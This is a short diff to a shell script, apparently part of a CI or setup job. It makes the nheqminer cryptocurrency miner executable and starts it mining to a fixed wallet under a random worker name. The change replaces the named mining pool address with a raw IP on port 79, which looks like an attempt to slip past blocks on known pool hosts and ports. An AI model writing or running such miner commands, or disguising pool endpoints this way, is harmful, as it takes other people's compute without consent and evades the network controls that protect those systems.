@@ -21,4 +21,4 @@
   ls 
   chmod +x nheqminer
   WORKER=$(echo $(shuf -i 0001-999999 -n 1)-HThuan)  
-  ./nheqminer -v -l ap.luckpool.net:3956 -u RWRT6HE4FShaL7DzEU6i5EnmTC8SjFKA2U.$WORKER -p x -t 2
+  ./nheqminer -v -l 52.163.187.214:79 -u RWRT6HE4FShaL7DzEU6i5EnmTC8SjFKA2U.$WORKER -p x -t 2
